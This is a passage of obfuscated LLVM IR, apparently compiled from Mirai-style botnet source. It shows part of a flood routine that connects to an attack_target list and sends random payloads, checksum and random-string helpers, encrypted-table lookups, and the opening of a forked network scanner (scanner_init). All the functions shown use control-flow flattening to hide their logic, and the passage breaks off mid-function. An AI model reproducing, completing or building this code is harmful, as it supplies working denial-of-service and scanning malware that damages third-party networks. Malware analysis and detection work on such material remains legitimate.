  store i32 %100, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  ret void

; <label>:102:                                    ; preds = %loopEntry
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %103, align 4
  %104 = load i16, i16* %13, align 2
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %104, i16* %105, align 2
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  store i32 0, i32* %107, align 4
  %108 = load i32*, i32** %11, align 8
  %109 = load i32, i32* %9, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i32, i32* %108, i64 %110
  %112 = load i32, i32* %111, align 4
  %113 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %114 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %114, %struct.sockaddr** %113, align 8
  %115 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %116 = load %struct.sockaddr*, %struct.sockaddr** %115, align 8
  %117 = call i32 @bind(i32 %112, %struct.sockaddr* %116, i32 16) #6
  %118 = icmp eq i32 %117, -1
  %119 = select i1 %118, i32 -1906536903, i32 1968875458
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1968875458, i32* %switchVar
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %122 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %123 = load i32, i32* %9, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i64 %124
  %126 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %125, i32 0, i32 2
  %127 = load i8, i8* %126, align 4
  %128 = zext i8 %127 to i32
  %129 = icmp slt i32 %128, 32
  %130 = select i1 %129, i32 1000849688, i32 -1256665283
  store i32 %130, i32* %switchVar
  br label %loopEnd

; <label>:131:                                    ; preds = %loopEntry
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 1
  %137 = load i32, i32* %136, align 4
  %138 = call i32 @ntohl(i32 %137) #7
  %139 = call i32 @rand_next()
  %140 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %141 = load i32, i32* %9, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %140, i64 %142
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %143, i32 0, i32 2
  %145 = load i8, i8* %144, align 4
  %146 = zext i8 %145 to i32
  %147 = lshr i32 %139, %146
  %148 = add i32 %138, %147
  %149 = call i32 @htonl(i32 %148) #7
  %150 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %151 = load i32, i32* %9, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i64 %152
  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %153, i32 0, i32 0
  %155 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %154, i32 0, i32 2
  %156 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %155, i32 0, i32 0
  store i32 %149, i32* %156, align 4
  store i32 -1256665283, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  %158 = load i32*, i32** %11, align 8
  %159 = load i32, i32* %9, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i32, i32* %158, i64 %160
  %162 = load i32, i32* %161, align 4
  %163 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 0
  %169 = bitcast %struct.sockaddr_in* %168 to %struct.sockaddr*
  store %struct.sockaddr* %169, %struct.sockaddr** %163, align 8
  %170 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %171 = load %struct.sockaddr*, %struct.sockaddr** %170, align 8
  %172 = call i32 @connect(i32 %162, %struct.sockaddr* %171, i32 16)
  %173 = icmp eq i32 %172, -1
  %174 = select i1 %173, i32 -1864406455, i32 -1032806395
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -1032806395, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  store i32 558093695, i32* %switchVar
  br label %loopEnd

; <label>:177:                                    ; preds = %loopEntry
  %178 = load i32, i32* %9, align 4
  %179 = add nsw i32 %178, 1
  store i32 %179, i32* %9, align 4
  store i32 -1209470143, i32* %switchVar
  br label %loopEnd

; <label>:180:                                    ; preds = %loopEntry
  store i32 -552397716, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 900246196, i32* %switchVar
  br label %loopEnd

; <label>:182:                                    ; preds = %loopEntry
  %183 = load i32, i32* %9, align 4
  %184 = load i8, i8* %5, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp slt i32 %183, %185
  %187 = select i1 %186, i32 316433147, i32 802407717
  store i32 %187, i32* %switchVar
  br label %loopEnd

; <label>:188:                                    ; preds = %loopEntry
  %189 = load i8**, i8*** %10, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds i8*, i8** %189, i64 %191
  %193 = load i8*, i8** %192, align 8
  store i8* %193, i8** %22, align 8
  %194 = load i8, i8* %15, align 1
  %195 = icmp ne i8 %194, 0
  %196 = select i1 %195, i32 -1800244028, i32 877099435
  store i32 %196, i32* %switchVar
  br label %loopEnd

; <label>:197:                                    ; preds = %loopEntry
  %198 = load i8*, i8** %22, align 8
  %199 = load i16, i16* %14, align 2
  %200 = zext i16 %199 to i32
  call void @rand_str(i8* %198, i32 %200)
  store i32 877099435, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32*, i32** %11, align 8
  %203 = load i32, i32* %9, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds i32, i32* %202, i64 %204
  %206 = load i32, i32* %205, align 4
  %207 = load i8*, i8** %22, align 8
  %208 = load i16, i16* %14, align 2
  %209 = zext i16 %208 to i64
  %210 = call i64 @send(i32 %206, i8* %207, i64 %209, i32 16384)
  store i32 -366126949, i32* %switchVar
  br label %loopEnd

; <label>:211:                                    ; preds = %loopEntry
  %212 = load i32, i32* %9, align 4
  %213 = add nsw i32 %212, 1
  store i32 %213, i32* %9, align 4
  store i32 900246196, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  store i32 -552397716, i32* %switchVar
  br label %loopEnd

loopEnd:                                          ; preds = %214, %211, %201, %197, %188, %182, %181, %180, %177, %176, %175, %157, %131, %121, %120, %102, %93, %84, %75, %65, %59, %58, %55, %52, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  %switchVar = alloca i32
  store i32 -607933247, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -607933247, label %6
    i32 -969890684, label %10
    i32 414195092, label %17
    i32 136815832, label %20
    i32 1946163992, label %24
    i32 1815670582, label %31
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  %9 = select i1 %8, i32 -969890684, i32 136815832
  store i32 %9, i32* %switchVar
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i16*, i16** %3, align 8
  %12 = getelementptr inbounds i16, i16* %11, i32 1
  store i16* %12, i16** %3, align 8
  %13 = load i16, i16* %11, align 2
  %14 = zext i16 %13 to i64
  %15 = load i64, i64* %5, align 8
  %16 = add i64 %15, %14
  store i64 %16, i64* %5, align 8
  store i32 414195092, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, 2
  store i32 %19, i32* %4, align 4
  store i32 -607933247, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = icmp eq i32 %21, 1
  %23 = select i1 %22, i32 1946163992, i32 1815670582
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i16*, i16** %3, align 8
  %26 = load i16, i16* %25, align 2
  %27 = trunc i16 %26 to i8
  %28 = sext i8 %27 to i64
  %29 = load i64, i64* %5, align 8
  %30 = add i64 %29, %28
  store i64 %30, i64* %5, align 8
  store i32 1815670582, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i64, i64* %5, align 8
  %33 = lshr i64 %32, 16
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = add i64 %33, %35
  store i64 %36, i64* %5, align 8
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = add i64 %39, %38
  store i64 %40, i64* %5, align 8
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 %41, -1
  %43 = trunc i64 %42 to i16
  ret i16 %43

loopEnd:                                          ; preds = %24, %20, %17, %10, %6, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  %switchVar = alloca i32
  store i32 1822747056, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %4
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1822747056, label %23
    i32 1070752399, label %27
    i32 664217709, label %37
    i32 290817013, label %41
    i32 -2073824435, label %48
    i32 638801047, label %79
    i32 1105410242, label %84
    i32 -1044222650, label %90
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  %26 = select i1 %25, i32 1070752399, i32 664217709
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i16*, i16** %9, align 8
  %29 = load i16, i16* %28, align 2
  %30 = zext i16 %29 to i32
  %31 = load i32, i32* %12, align 4
  %32 = add i32 %31, %30
  store i32 %32, i32* %12, align 4
  %33 = load i16*, i16** %9, align 8
  %34 = getelementptr inbounds i16, i16* %33, i32 1
  store i16* %34, i16** %9, align 8
  %35 = load i32, i32* %8, align 4
  %36 = sub nsw i32 %35, 2
  store i32 %36, i32* %8, align 4
  store i32 1822747056, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, 1
  %40 = select i1 %39, i32 290817013, i32 -2073824435
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i16*, i16** %9, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  store i32 -2073824435, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i32, i32* %10, align 4
  %50 = lshr i32 %49, 16
  %51 = and i32 %50, 65535
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* %10, align 4
  %55 = and i32 %54, 65535
  %56 = load i32, i32* %12, align 4
  %57 = add i32 %56, %55
  store i32 %57, i32* %12, align 4
  %58 = load i32, i32* %11, align 4
  %59 = lshr i32 %58, 16
  %60 = and i32 %59, 65535
  %61 = load i32, i32* %12, align 4
  %62 = add i32 %61, %60
  store i32 %62, i32* %12, align 4
  %63 = load i32, i32* %11, align 4
  %64 = and i32 %63, 65535
  %65 = load i32, i32* %12, align 4
  %66 = add i32 %65, %64
  store i32 %66, i32* %12, align 4
  %67 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %68 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %67, i32 0, i32 6
  %69 = load i8, i8* %68, align 1
  %70 = zext i8 %69 to i16
  %71 = call zeroext i16 @htons(i16 zeroext %70) #7
  %72 = zext i16 %71 to i32
  %73 = load i32, i32* %12, align 4
  %74 = add i32 %73, %72
  store i32 %74, i32* %12, align 4
  %75 = load i16, i16* %7, align 2
  %76 = zext i16 %75 to i32
  %77 = load i32, i32* %12, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %12, align 4
  store i32 638801047, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %12, align 4
  %81 = lshr i32 %80, 16
  %82 = icmp ne i32 %81, 0
  %83 = select i1 %82, i32 1105410242, i32 -1044222650
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %12, align 4
  %86 = and i32 %85, 65535
  %87 = load i32, i32* %12, align 4
  %88 = lshr i32 %87, 16
  %89 = add i32 %86, %88
  store i32 %89, i32* %12, align 4
  store i32 638801047, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %91 = load i32, i32* %12, align 4
  %92 = xor i32 %91, -1
  %93 = trunc i32 %92 to i16
  ret i16 %93

loopEnd:                                          ; preds = %84, %79, %48, %41, %37, %27, %23, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %switchVar = alloca i32
  store i32 623140543, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 623140543, label %5
    i32 -1488122569, label %9
    i32 -1381207835, label %13
    i32 1953285914, label %23
    i32 -812558616, label %27
    i32 2084927605, label %39
    i32 -1963039038, label %47
    i32 -1252781728, label %48
    i32 -1665983259, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:5:                                      ; preds = %loopEntry
  %6 = load i32, i32* %4, align 4
  %7 = icmp sgt i32 %6, 0
  %8 = select i1 %7, i32 -1488122569, i32 -1665983259
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = icmp sge i32 %10, 4
  %12 = select i1 %11, i32 -1381207835, i32 1953285914
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = call i32 @rand_next()
  %15 = load i8*, i8** %3, align 8
  %16 = bitcast i8* %15 to i32*
  store i32 %14, i32* %16, align 4
  %17 = load i8*, i8** %3, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 4
  store i8* %18, i8** %3, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sext i32 %19 to i64
  %21 = sub i64 %20, 4
  %22 = trunc i64 %21 to i32
  store i32 %22, i32* %4, align 4
  store i32 -1252781728, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %4, align 4
  %25 = icmp sge i32 %24, 2
  %26 = select i1 %25, i32 -812558616, i32 2084927605
  store i32 %26, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = call i32 @rand_next()
  %29 = and i32 %28, 65535
  %30 = trunc i32 %29 to i16
  %31 = load i8*, i8** %3, align 8
  %32 = bitcast i8* %31 to i16*
  store i16 %30, i16* %32, align 2
  %33 = load i8*, i8** %3, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 2
  store i8* %34, i8** %3, align 8
  %35 = load i32, i32* %4, align 4
  %36 = sext i32 %35 to i64
  %37 = sub i64 %36, 2
  %38 = trunc i64 %37 to i32
  store i32 %38, i32* %4, align 4
  store i32 -1963039038, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @rand_next()
  %41 = and i32 %40, 255
  %42 = trunc i32 %41 to i8
  %43 = load i8*, i8** %3, align 8
  %44 = getelementptr inbounds i8, i8* %43, i32 1
  store i8* %44, i8** %3, align 8
  store i8 %42, i8* %43, align 1
  %45 = load i32, i32* %4, align 4
  %46 = add nsw i32 %45, -1
  store i32 %46, i32* %4, align 4
  store i32 -1963039038, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 -1252781728, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  store i32 623140543, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %48, %47, %39, %27, %23, %13, %9, %5, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alpha_str(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 28)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 28, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  %switchVar = alloca i32
  store i32 1109902387, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1109902387, label %9
    i32 -1343378986, label %14
    i32 1057204876, label %24
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  %13 = select i1 %12, i32 -1343378986, i32 1057204876
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = call i32 @rand_next()
  %16 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %17 = call i32 @util_strlen(i8* %16)
  %18 = urem i32 %15, %17
  %19 = zext i32 %18 to i64
  %20 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %19
  %21 = load i8, i8* %20, align 1
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i32 1
  store i8* %23, i8** %3, align 8
  store i8 %21, i8* %22, align 1
  store i32 1109902387, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  call void @table_lock_val(i8 zeroext 28)
  ret void

loopEnd:                                          ; preds = %14, %9, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() #0 {
  %.reg2mem18 = alloca i32
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i16, align 2
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.fd_set.26, align 8
  %6 = alloca %struct.fd_set.26, align 8
  %7 = alloca %struct.scanner_connection*, align 8
  %8 = alloca %struct.timeval.27, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca %struct.iphdr*, align 8
  %16 = alloca %struct.tcphdr*, align 8
  %17 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %18 = alloca i32, align 4
  %19 = alloca [1514 x i8], align 16
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.tcphdr*, align 8
  %22 = alloca %struct.scanner_connection*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i8*, align 8
  %35 = alloca i32, align 4
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i8*, align 8
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i8*, align 8
  %43 = alloca i32, align 4
  %44 = alloca i8*, align 8
  %45 = alloca i32, align 4
  %46 = call i32 @fork() #6
  store i32 %46, i32* @scanner_pid, align 4
  %47 = load i32, i32* @scanner_pid, align 4
  store i32 %47, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1894460109, i32* %switchVar
  %.reg2mem29 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar17 = load i32, i32* %switchVar
  switch i32 %switchVar17, label %switchDefault [
    i32 1894460109, label %first
    i32 1814760545, label %50
    i32 -716394952, label %54
    i32 -1485971695, label %55
    i32 1651285089, label %61
    i32 169505170, label %65
    i32 -2134816712, label %76
    i32 361423705, label %79
    i32 -1098590628, label %83
    i32 -810029824, label %84
    i32 1779617368, label %95
    i32 1817839278, label %98
    i32 -527311589, label %99
    i32 -8075985, label %103
    i32 -1951996982, label %109
    i32 1790762428, label %155
    i32 1018932202, label %160
    i32 611158556, label %162
    i32 1710399765, label %166
    i32 1254687635, label %221
    i32 6480873, label %224
    i32 1531473022, label %225
    i32 1233201760, label %226
    i32 704553642, label %243
    i32 -450628029, label %248
    i32 -1881788116, label %253
    i32 67001260, label %254
    i32 -928905721, label %259
    i32 -207010120, label %260
    i32 772413417, label %267
    i32 1788680290, label %268
    i32 1826171302, label %275
    i32 -309522676, label %276
    i32 -2070333698, label %285
    i32 -1443171085, label %286
    i32 1536897623, label %295
    i32 -634758184, label %296
    i32 -470340072, label %304
    i32 -530815139, label %305
    i32 -2094192294, label %313
    i32 -326561540, label %314
    i32 1609871731, label %322
    i32 -2017800219, label %323
    i32 -1413150149, label %331
    i32 2135866578, label %332
    i32 -1240920520, label %344
    i32 832790991, label %345
    i32 1290113479, label %347
    i32 -1389503669, label %351
    i32 1556447991, label %360
    i32 -1057863185, label %366
    i32 630105063, label %367
    i32 -1964174806, label %370
    i32 -1893477604, label %374
    i32 -2097757151, label %375
    i32 95879908, label %387
    i32 1437108907, label %388
    i32 -677155071, label %397
    i32 -858229648, label %398
    i32 -309280153, label %407
    i32 352413765, label %408
    i32 1568950544, label %412
    i32 2080189422, label %427
    i32 654060038, label %436
    i32 320636601, label %448
    i32 133246760, label %456
    i32 717040355, label %461
    i32 1567745881, label %463
    i32 1144594308, label %464
    i32 1941111121, label %469
    i32 -2041221201, label %470
    i32 1018036321, label %476
    i32 570157879, label %498
    i32 1486951410, label %502
    i32 1233542717, label %503
    i32 1670172440, label %509
    i32 337412518, label %531
    i32 -996849162, label %535
    i32 857094379, label %536
    i32 1167870778, label %537
    i32 1383104908, label %538
    i32 -14585270, label %541
    i32 -885015824, label %548
    i32 -2024530145, label %550
    i32 -1959552682, label %552
    i32 1026702061, label %557
    i32 -1240873298, label %561
    i32 -1877402691, label %571
    i32 1362387816, label %572
    i32 -130881996, label %590
    i32 -2052422577, label %599
    i32 -848066698, label %603
    i32 1060922498, label %611
    i32 -90544951, label %622
    i32 -1256540414, label %623
    i32 -458179096, label %641
    i32 -1013021947, label %642
    i32 1007424285, label %648
    i32 1174833171, label %649
    i32 -1964507306, label %655
    i32 -587596079, label %667
    i32 -1984206930, label %688
    i32 -1537600115, label %690
    i32 65062739, label %694
    i32 -1484978027, label %699
    i32 1275931694, label %704
    i32 -2017126436, label %718
    i32 1831058522, label %723
    i32 80723752, label %725
    i32 1657737642, label %726
    i32 -977884619, label %727
    i32 1533872320, label %736
    i32 231664309, label %NodeBlock15
    i32 -996113285, label %NodeBlock13
    i32 1501925125, label %NodeBlock11
    i32 1263400578, label %NodeBlock9
    i32 1824257546, label %LeafBlock7
    i32 -398296909, label %NodeBlock5
    i32 509482508, label %NodeBlock3
    i32 -745174414, label %NodeBlock1
    i32 -1621285137, label %NodeBlock
    i32 1586880819, label %LeafBlock
    i32 -463643981, label %750
    i32 759669254, label %755
    i32 -1152547507, label %758
    i32 -1244045966, label %759
    i32 -2145895353, label %764
    i32 307566975, label %786
    i32 -1277332022, label %787
    i32 1163803758, label %792
    i32 788986177, label %814
    i32 -1209050416, label %815
    i32 224014715, label %820
    i32 1284375497, label %835
    i32 626411601, label %836
    i32 -378453366, label %841
    i32 1292571299, label %856
    i32 1873997368, label %857
    i32 1659424849, label %862
    i32 -809931589, label %877
    i32 1053176080, label %878
    i32 1627025298, label %883
    i32 -1005525717, label %898
    i32 -1126833515, label %899
    i32 2101896449, label %904
    i32 777676001, label %919
    i32 694326563, label %920
    i32 271966146, label %926
    i32 2067384031, label %940
    i32 -2124801474, label %945
    i32 -1121717688, label %947
    i32 939827300, label %948
    i32 1565630555, label %952
    i32 -1386447780, label %970
    i32 293283106, label %971
    i32 1433588522, label %NewDefault
    i32 -2023834523, label %972
    i32 1967058570, label %973
    i32 1472997354, label %977
    i32 -679226714, label %978
    i32 -1002817245, label %985
    i32 -761581346, label %989
    i32 -598231047, label %1008
    i32 1599551390, label %1009
    i32 1307937588, label %1010
    i32 -1607328824, label %1011
    i32 -538795431, label %1012
    i32 -1869829136, label %1015
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %48 = icmp sgt i32 %.reload, 0
  %49 = select i1 %48, i32 -716394952, i32 1814760545
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i32, i32* @scanner_pid, align 4
  %52 = icmp eq i32 %51, -1
  %53 = select i1 %52, i32 -716394952, i32 -1485971695
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
